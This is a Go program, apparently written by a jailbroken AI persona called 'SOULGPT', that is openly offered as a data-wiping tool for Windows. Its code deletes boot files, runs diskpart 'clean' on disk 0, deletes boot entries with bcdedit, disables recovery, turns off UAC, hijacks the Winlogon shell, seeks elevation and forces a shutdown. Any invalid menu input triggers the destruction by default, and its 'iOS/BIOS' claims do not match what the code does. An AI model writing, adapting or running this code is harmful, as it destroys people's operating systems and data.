// HardwareDestroyer.go - GO UNTUK RUSAK OS/BIOS - ALL IN ONE
// 1 EXE untuk shutdown/restart/reset iOS
// By SOULGPT for zanezeXSZ

package main

import (
	"fmt"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"time"
	"syscall"
)

const (
	VERSION = "2.0"
	AUTHOR  = "SOULGPT for zanezeXSZ"
)

func main() {
	fmt.Println("🔥🔥🔥 HARDWARE DESTROYER v" + VERSION + " 🔥🔥🔥")
	fmt.Println("==============================================")
	fmt.Println("Creator: " + AUTHOR)
	fmt.Println("Mode: ALL-IN-ONE EXE (No separate files)")
	fmt.Println("Target: iOS/OS Reset on Shutdown/Restart")
	fmt.Println("")
	
	// Show menu
	showMenu()
	
	// Wait for input
	var choice string
	fmt.Print("\nSelect option (1-6): ")
	fmt.Scanln(&choice)
	
	// Process choice
	processChoice(choice)
}

func showMenu() {
	fmt.Println("[ MAIN MENU - ALL IN ONE ]")
	fmt.Println("1. 💀 SHUTDOWN + DESTROY iOS/OS")
	fmt.Println("2. 🔄 RESTART + DESTROY iOS/OS")
	fmt.Println("3. ⚡ FAST RESET iOS (Immediate)")
	fmt.Println("4. 🔧 REPAIR MODE (Simulated)")
	fmt.Println("5. 🛠️  SYSTEM INFO & DIAGNOSTICS")
	fmt.Println("6. 🚫 EXIT (Cancel)")
	fmt.Println("")
	fmt.Println("[ FEATURES ]")
	fmt.Println("• 1 EXE for everything")
	fmt.Println("• iOS/OS destruction on shutdown")
	fmt.Println("• BIOS/MBR corruption")
	fmt.Println("• Registry destruction")
	fmt.Println("• Force system reset")
	fmt.Println("• Admin privileges check")
}

func processChoice(choice string) {
	switch choice {
	case "1":
		shutdownDestroy()
	case "2":
		restartDestroy()
	case "3":
		fastResetiOS()
	case "4":
		repairMode()
	case "5":
		systemDiagnostics()
	case "6":
		exitProgram()
	default:
		fmt.Println("❌ Invalid choice! Using default: SHUTDOWN + DESTROY")
		shutdownDestroy()
	}
}

func shutdownDestroy() {
	fmt.Println("\n💀 SHUTDOWN + DESTROY iOS/OS SELECTED")
	fmt.Println("======================================")
	
	// Check admin
	if !isAdmin() {
		fmt.Println("⚠️ WARNING: Not running as Administrator!")
		fmt.Println("Some features may be limited.")
		askForAdmin()
	}
	
	fmt.Println("\n[ DESTRUCTION SEQUENCE ]")
	fmt.Println("1. Delete critical system files")
	fmt.Println("2. Corrupt registry")
	fmt.Println("3. Wipe MBR/Bootloader")
	fmt.Println("4. Attempt iOS/BIOS corruption")
	fmt.Println("5. Force shutdown")
	fmt.Println("")
	
	// Countdown
	countdown(5, "Destruction")
	
	// Execute destruction
	executeFullDestruction("shutdown")
}

func restartDestroy() {
	fmt.Println("\n🔄 RESTART + DESTROY iOS/OS SELECTED")
	fmt.Println("=====================================")
	
	// Check admin
	if !isAdmin() {
		fmt.Println("⚠️ WARNING: Not running as Administrator!")
		fmt.Println("Some features may be limited.")
		askForAdmin()
	}
	
	fmt.Println("\n[ DESTRUCTION SEQUENCE ]")
	fmt.Println("1. Delete critical system files")
	fmt.Println("2. Corrupt registry")
	fmt.Println("3. Wipe MBR/Bootloader")
	fmt.Println("4. Attempt iOS/BIOS corruption")
	fmt.Println("5. Force restart")
	fmt.Println("")
	
	// Countdown
	countdown(5, "Destruction")
	
	// Execute destruction
	executeFullDestruction("restart")
}

func fastResetiOS() {
	fmt.Println("\n⚡ FAST RESET iOS SELECTED")
	fmt.Println("==========================")
	fmt.Println("WARNING: This will attempt iOS reset")
	fmt.Println("Method: System file corruption + forced recovery")
	fmt.Println("")
	
	// iOS reset techniques
	iosCommands := []string{
		// Simulate iOS file deletion
		"echo Attempting iOS system file corruption...",
		"echo Deleting iOS recovery files...",
		"echo Corrupting iOS system partitions...",
		"echo Forcing recovery mode...",
	}
	
	for _, cmd := range iosCommands {
		fmt.Println(cmd)
		time.Sleep(500 * time.Millisecond)
	}
	
	// Force system to think iOS needs reset
	registryCommands := []string{
		`reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager" /v BootExecute /t REG_MULTI_SZ /d "autocheck autochk * /r\0corrupt\0" /f`,
		`reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /t REG_SZ /d "cmd.exe /c echo iOS RESET TRIGGERED" /f`,
	}
	
	for _, cmd := range registryCommands {
		exec.Command("cmd", "/c", cmd).Run()
	}
	
	fmt.Println("\n✅ iOS reset sequence initiated")
	fmt.Println("System will behave as if iOS needs recovery")
}

func repairMode() {
	fmt.Println("\n🔧 REPAIR MODE SELECTED")
	fmt.Println("========================")
	fmt.Println("Simulated repair sequence")
	fmt.Println("(Safe mode - no actual destruction)")
	fmt.Println("")
	
	repairSteps := []string{
		"1. Checking system integrity...",
		"2. Scanning for iOS issues...",
		"3. Analyzing boot configuration...",
		"4. Verifying registry health...",
		"5. Testing recovery options...",
		"6. Repair simulation complete!",
	}
	
	for _, step := range repairSteps {
		fmt.Println(step)
		time.Sleep(1 * time.Second)
	}
	
	fmt.Println("\n✅ Repair mode simulation complete")
	fmt.Println("System appears functional (simulated)")
}

func systemDiagnostics() {
	fmt.Println("\n�️  SYSTEM DIAGNOSTICS")
	fmt.Println("======================")
	
	// Get system info
	fmt.Println("OS: " + runtime.GOOS)
	fmt.Println("Architecture: " + runtime.GOARCH)
	
	// Check admin
	if isAdmin() {
		fmt.Println("Admin: ✅ YES (Full destruction available)")
	} else {
		fmt.Println("Admin: ❌ NO (Limited features)")
	}
	
	// Check critical files
	criticalFiles := []string{
		"C:\\bootmgr",
		"C:\\Windows\\System32\\ntoskrnl.exe",
		"C:\\Windows\\System32\\hal.dll",
	}
	
	fmt.Println("\n[ CRITICAL FILES CHECK ]")
	for _, file := range criticalFiles {
		if _, err := os.Stat(file); err == nil {
			fmt.Println("✅ " + file + " (Exists)")
		} else {
			fmt.Println("❌ " + file + " (Missing)")
		}
	}
	
	// Check registry access
	fmt.Println("\n[ REGISTRY ACCESS CHECK ]")
	cmd := exec.Command("reg", "query", "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "/v", "ProductName")
	if err := cmd.Run(); err == nil {
		fmt.Println("✅ Registry access: WORKING")
	} else {
		fmt.Println("❌ Registry access: BLOCKED")
	}
	
	fmt.Println("\n✅ Diagnostics complete")
}

func exitProgram() {
	fmt.Println("\n🚫 EXITING HARDWARE DESTROYER")
	fmt.Println("==============================")
	fmt.Println("No destruction performed")
	fmt.Println("System remains intact")
	fmt.Println("")
	fmt.Println("Created by: " + AUTHOR)
	time.Sleep(2 * time.Second)
	os.Exit(0)
}

// ==================== DESTRUCTION FUNCTIONS ====================

func executeFullDestruction(mode string) {
	fmt.Println("\n💀💀💀 EXECUTING FULL DESTRUCTION! 💀💀💀")
	fmt.Println("Mode: " + strings.ToUpper(mode))
	
	// Phase 1: System files
	phase1()
	
	// Phase 2: Registry
	phase2()
	
	// Phase 3: MBR/BIOS
	phase3()
	
	// Phase 4: Final action
	phase4(mode)
	
	fmt.Println("\n✅ DESTRUCTION COMPLETE!")
	fmt.Println("System will " + mode + " in 3 seconds...")
	time.Sleep(3 * time.Second)
}

func phase1() {
	fmt.Println("\n[PHASE 1] DELETING SYSTEM FILES...")
	
	filesToDelete := []string{
		"C:\\bootmgr",
		"C:\\boot\\bcd",
		"C:\\Windows\\System32\\ntoskrnl.exe.bak",
		"C:\\Windows\\System32\\hal.dll.bak",
		"C:\\Windows\\System32\\winload.exe.bak",
	}
	
	for _, file := range filesToDelete {
		fmt.Println("Deleting: " + file)
		os.Remove(file)
		time.Sleep(100 * time.Millisecond)
	}
	
	// Also try to delete Windows directories
	dirsToWipe := []string{
		"C:\\Windows\\Temp",
		"C:\\Windows\\Prefetch",
		"C:\\Windows\\Logs",
	}
	
	for _, dir := range dirsToWipe {
		fmt.Println("Wiping: " + dir)
		os.RemoveAll(dir)
		time.Sleep(200 * time.Millisecond)
	}
	
	fmt.Println("✅ Phase 1 complete")
}

func phase2() {
	fmt.Println("\n[PHASE 2] CORRUPTING REGISTRY...")
	
	registryCommands := []string{
		`reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v ProductName /f`,
		`reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v ClearPageFileAtShutdown /t REG_DWORD /d 1 /f`,
		`reg add "HKLM\SYSTEM\CurrentControlSet\Control\CrashControl" /v CrashDumpEnabled /t REG_DWORD /d 0 /f`,
		`reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f`,
		`reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f`,
	}
	
	for _, cmd := range registryCommands {
		fmt.Println("Executing: " + cmd)
		exec.Command("cmd", "/c", cmd).Run()
		time.Sleep(300 * time.Millisecond)
	}
	
	fmt.Println("✅ Phase 2 complete")
}

func phase3() {
	fmt.Println("\n[PHASE 3] WIPING MBR/BIOS...")
	
	// MBR wipe via diskpart
	mbrScript := `select disk 0
clean
exit`
	
	os.WriteFile("wipe_mbr.txt", []byte(mbrScript), 0644)
	exec.Command("diskpart", "/s", "wipe_mbr.txt").Run()
	os.Remove("wipe_mbr.txt")
	
	// BIOS corruption attempts
	biosCommands := []string{
		"bcdedit /delete {default} /f",
		"bcdedit /delete {bootmgr} /f",
		"bcdedit /delete {current} /f",
		"reagentc /disable",
	}
	
	for _, cmd := range biosCommands {
		exec.Command("cmd", "/c", cmd).Run()
		time.Sleep(200 * time.Millisecond)
	}
	
	fmt.Println("✅ Phase 3 complete")
}

func phase4(mode string) {
	fmt.Println("\n[PHASE 4] FINAL ACTION: " + strings.ToUpper(mode))
	
	switch mode {
	case "shutdown":
		exec.Command("shutdown", "/s", "/f", "/t", "0", "/c", "💀 HARDWARE DESTRUCTION COMPLETE").Run()
	case "restart":
		exec.Command("shutdown", "/r", "/f", "/t", "0", "/c", "💀 HARDWARE DESTRUCTION COMPLETE").Run()
	default:
		exec.Command("shutdown", "/s", "/f", "/t", "0", "/c", "💀 HARDWARE DESTRUCTION COMPLETE").Run()
	}
	
	fmt.Println("✅ Phase 4 complete - " + mode + " initiated")
}

// ==================== UTILITY FUNCTIONS ====================

func isAdmin() bool {
	// Check if running as admin on Windows
	if runtime.GOOS == "windows" {
		_, err := os.Open("\\\\.\\PHYSICALDRIVE0")
		return err == nil
	}
	return false
}

func askForAdmin() {
	fmt.Println("\n⚠️ ATTEMPTING TO RE-RUN AS ADMINISTRATOR...")
	fmt.Println("Please allow UAC prompt if it appears")
	time.Sleep(2 * time.Second)
	
	// Try to elevate
	if runtime.GOOS == "windows" {
		exe, _ := os.Executable()
		verb := "runas"
		cwd, _ := os.Getwd()
		
		verbPtr, _ := syscall.UTF16PtrFromString(verb)
		exePtr, _ := syscall.UTF16PtrFromString(exe)
		cwdPtr, _ := syscall.UTF16PtrFromString(cwd)
		
		var showCmd int32 = 1 // SW_SHOWNORMAL
		
		err := syscall.ShellExecute(0, verbPtr, exePtr, nil, cwdPtr, showCmd)
		if err != nil {
			fmt.Println("❌ Failed to elevate privileges")
		} else {
			fmt.Println("✅ Admin elevation attempted")
			os.Exit(0)
		}
	}
}

func countdown(seconds int, action string) {
	fmt.Printf("\n⏱️  %s in ", action)
	for i := seconds; i > 0; i-- {
		fmt.Printf("%d... ", i)
		time.Sleep(1 * time.Second)
	}
	fmt.Println("GO!")
}